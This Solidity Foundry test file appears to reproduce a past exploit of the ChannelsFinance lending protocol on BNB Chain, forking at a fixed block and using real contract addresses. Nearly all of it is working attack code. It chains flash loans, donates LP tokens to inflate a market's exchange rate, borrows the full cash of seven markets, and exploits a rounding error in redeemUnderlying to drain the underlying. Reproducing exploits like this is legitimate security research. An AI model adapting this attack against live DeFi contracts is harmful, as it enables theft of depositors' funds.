// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";

import "@interface/IERC20.sol";
import "@interface/IWBNB.sol";
import "@interface/ICompound.sol";
import "@interface/IUniswapV3.sol";
import "@interface/IUniswapV2.sol";

interface IcCLP_BTCB_BUSD is ICErc20Delegator {
    function gulp() external;
}

ICErc20Delegator constant cWBNB = ICErc20Delegator(
    payable(0x860DF3e99f6223D695aB51b2FB9eaa92Fa903E8D)
);
ICErc20Delegator constant cBUSD = ICErc20Delegator(
    payable(0xca797539f004C0F9c206678338f820AC38466D4b)
);
ICErc20Delegator constant cUSDT = ICErc20Delegator(
    payable(0xBa5B37100538Cde248AAA4c92FB330fCf91F557C)
);
ICErc20Delegator constant cUSDC = ICErc20Delegator(
    payable(0x33e68c922d19D74ce845546a5c12A66ea31385c4)
);
ICErc20Delegator constant cDAI = ICErc20Delegator(
    payable(0x7D247295a6938587C581f5Bb8CBD98A72388E530)
);
ICErc20Delegator constant cETH = ICErc20Delegator(
    payable(0x11797D61fD4BfF9728113601782D4444503093d7)
);
ICErc20Delegator constant cBTC = ICErc20Delegator(
    payable(0x7140A671Da66C0BD411E3fc3B15C51C36dBB5cA3)
);
ICErc20Delegator constant cFIL = ICErc20Delegator(
    payable(0xf77ef89255Fb387C6ebA1557c615A8B31A518aa2)
);
IcCLP_BTCB_BUSD constant cCLP_BTCB_BUSD = IcCLP_BTCB_BUSD(
    payable(0x93790C641D029D1cBd779D87b88f67704B6A8F4C)
);
IWBNB constant WBNB = IWBNB(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
IERC20 constant PancakeSwapToken = IERC20(
    0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82
);
IERC20 constant BTCB = IERC20(0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c);
IERC20 constant BUSD = IERC20(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56);
IERC20 constant USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
IERC20 constant ETHToken = IERC20(0x2170Ed0880ac9A755fd29B2688956BD959F933F8);
IERC20 constant USDC = IERC20(0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d);
IERC20 constant DAI = IERC20(0x1AF3F329e8BE154074D8769D1FFa4eE058B1DBc3);

IComptroller constant Comptroller = IComptroller(
    0xFC518333F4bC56185BDd971a911fcE03dEe4fC8c
);
IUniswapV3Pool constant USDT_BTCB = IUniswapV3Pool(
    0x46Cf1cF8c69595804ba91dFdd8d6b960c9B0a7C4
);
IUniswapV3Pool constant USDT_BUSD = IUniswapV3Pool(
    0x4f3126d5DE26413AbDCF6948943FB9D0847d9818
);
IUniswapV2Pair constant BTCB_BUSD = IUniswapV2Pair(
    0xF45cd219aEF8618A92BAa7aD848364a158a24F33
);
address constant attackContract = 0x07e536F23a197F6FB76F42aD01ac2Bcdc3BF738E;

contract ChannelsFinanceTest is Test {
    function setUp() public {
        vm.createSelectFork("bsc", 34806205);
        vm.label(address(cWBNB), "cWBNB");
        vm.label(address(cFIL), "cFIL");
        vm.label(address(cCLP_BTCB_BUSD), "cCLP_BTCB_BUSD");
        vm.label(address(WBNB), "WBNB");
        vm.label(address(BTCB), "BTCB");
        vm.label(address(BUSD), "BUSD");
        vm.label(address(PancakeSwapToken), "PancakeSwapToken");
        vm.label(address(Comptroller), "Comptroller");
        vm.label(address(USDT_BTCB), "USDT_BTCB");
        vm.label(address(USDT_BUSD), "USDT_BUSD");
        vm.label(address(BTCB_BUSD), "BTCB_BUSD");
    }

    function print(string memory _txt, uint256 value, uint256 decimal) public {
        emit log_named_decimal_uint(_txt, value, decimal);
    }

    function testExploit() public {
        // Starting balances.
        // Exploiter transfered amounts of PancakeSwap Token to attack contract before first attack tx
        // Transfer txs:
        // 0x0237855c63eb85c5f437fba5267cc869a08c58a49501e3e5ebec9990bdd97565

        deal(address(PancakeSwapToken), address(this), 2 ether);
        deal(address(USDT), address(this), 0);

        print(
            "Exploiter WBNB balance before attack",
            WBNB.balanceOf(address(this)),
            18
        );

        print(
            "Exploiter BUSD balance before attack",
            BUSD.balanceOf(address(this)),
            BUSD.decimals()
        );

        print(
            "Exploiter USDT balance before attack",
            USDT.balanceOf(address(this)),
            USDT.decimals()
        );

        print(
            "Exploiter BTCB balance before attack",
            BTCB.balanceOf(address(this)),
            BTCB.decimals()
        );

        print(
            "Exploiter ETHToken balance before attack",
            ETHToken.balanceOf(address(this)),
            ETHToken.decimals()
        );

        print(
            "Exploiter USDC balance before attack",
            USDC.balanceOf(address(this)),
            USDC.decimals()
        );

        print(
            "Exploiter DAI balance before attack",
            DAI.balanceOf(address(this)),
            DAI.decimals()
        );

        emit log_string(
            "-----------------------------------------------------"
        );

        emit log_named_uint(
            "Total supply value in vulnerable contract after first attack tx",
            cCLP_BTCB_BUSD.totalSupply()
        );

        emit log_named_uint(
            "Exploiter cCLP_BTCB_BUSD balance after first attack tx",
            cCLP_BTCB_BUSD.balanceOf(attackContract)
        );

        // Transfer 2 tokens cCLP_BTCB_BUSD from attack contract to this contract.
        // I do this because of complications with first tx explained above
        // This step is needed to withdraw underlying BTCB_BUSD tokens later
        vm.prank(attackContract);
        cCLP_BTCB_BUSD.approve(address(this), type(uint256).max);
        cCLP_BTCB_BUSD.transferFrom(
            attackContract,
            address(this),
            cCLP_BTCB_BUSD.balanceOf(attackContract)
        );

        USDT_BTCB.flash(address(this), 0, 11_900e15, "");

        print(
            "Exploiter WBNB balance after attack",
            WBNB.balanceOf(address(this)),
            18
        );

        print(
            "Exploiter BUSD balance after attack",
            BUSD.balanceOf(address(this)),
            BUSD.decimals()
        );

        print(
            "Exploiter USDT balance after attack",
            USDT.balanceOf(address(this)),
            USDT.decimals()
        );

        print(
            "Exploiter BTCB balance after attack",
            BTCB.balanceOf(address(this)),
            BTCB.decimals()
        );

        print(
            "Exploiter ETHToken balance after attack",
            ETHToken.balanceOf(address(this)),
            ETHToken.decimals()
        );

        print(
            "Exploiter USDC balance after attack",
            USDC.balanceOf(address(this)),
            USDC.decimals()
        );

        print(
            "Exploiter DAI balance after attack",
            DAI.balanceOf(address(this)),
            DAI.decimals()
        );
    }

    function pancakeV3FlashCallback(
        uint256 fee0,
        uint256 fee1,
        bytes calldata data
    ) external {
        fee0;
        data;
        if (msg.sender == address(USDT_BTCB)) {
            USDT_BUSD.flash(address(this), 0, 500_000e18, "");
            BTCB.transfer(address(USDT_BTCB), 11_900e15 + fee1);
        } else if (msg.sender == address(USDT_BUSD)) {
            // Transfer token amounts to pair and next mint liquidity
            (uint112 reserveBTCB, uint112 reserveBUSD, ) = BTCB_BUSD
                .getReserves();
            BTCB.transfer(address(BTCB_BUSD), (reserveBTCB * 115) / 100);
            BUSD.transfer(address(BTCB_BUSD), (reserveBUSD * 115) / 100);
            BTCB_BUSD.mint(address(this));
            // Transfer PancakeSwapToken to vulnerable contract
            PancakeSwapToken.transfer(
                address(cCLP_BTCB_BUSD),
                PancakeSwapToken.balanceOf(address(this))
            );

            emit log_named_uint(
                "Exploiter underlying BTCB_BUSD tokens balance before transfer to vulnerable contract",
                BTCB_BUSD.balanceOf(address(this))
            );

            // Transfer BTCB_BUSD to vulnerable contract
            BTCB_BUSD.transfer(
                address(cCLP_BTCB_BUSD),
                BTCB_BUSD.balanceOf(address(this))
            );

            emit log_named_uint(
                "Exploiter underlying BTCB_BUSD tokens balance after transfer to vulnerable contract",
                BTCB_BUSD.balanceOf(address(this))
            );

            cCLP_BTCB_BUSD.accrueInterest();

            // Enter to ChannelsFinance markets
            address[] memory cTokens = Comptroller.getAllMarkets();
            Comptroller.enterMarkets(cTokens);

            // At this moment exploiter can borrow more tokens than he should
            ICErc20Delegator[] memory tokensToSteal = new ICErc20Delegator[](7);
            tokensToSteal[0] = cWBNB;
            tokensToSteal[1] = cBUSD;
            tokensToSteal[2] = cUSDT;
            tokensToSteal[3] = cUSDC;
            tokensToSteal[4] = cDAI;
            tokensToSteal[5] = cETH;
            tokensToSteal[6] = cBTC;

            for (uint256 i; i < tokensToSteal.length; ++i) {
                uint256 amountToSteal = tokensToSteal[i].getCash();
                tokensToSteal[i].borrow(amountToSteal);
            }

            // redeemUnderlying function has rounding error.
            // Thanks to this attacker has used only one cCLP_BTCB_BUSD token to withdraw underlying tokens
            uint256 reserves = cCLP_BTCB_BUSD.totalReserves();
            uint256 redeemAmount = cCLP_BTCB_BUSD.getCash();
            cCLP_BTCB_BUSD.redeemUnderlying(redeemAmount - reserves - 1e9);
            emit log_named_uint(
                "Exploiter cCLP_BTCB_BUSD balance after call to redeemUnderlying()",
                cCLP_BTCB_BUSD.balanceOf(address(this))
            );
            emit log_named_uint(
                "Exploiter underlying BTCB_BUSD tokens balance after withdraw from vulnerable contract",
                BTCB_BUSD.balanceOf(address(this))
            );
            emit log_string(
                "-----------------------------------------------------"
            );
            BTCB_BUSD.transfer(
                address(BTCB_BUSD),
                BTCB_BUSD.balanceOf(address(this))
            );
            BTCB_BUSD.burn(address(this));
            BUSD.transfer(address(USDT_BUSD), 500_000e18 + fee1);
        }
    }
}
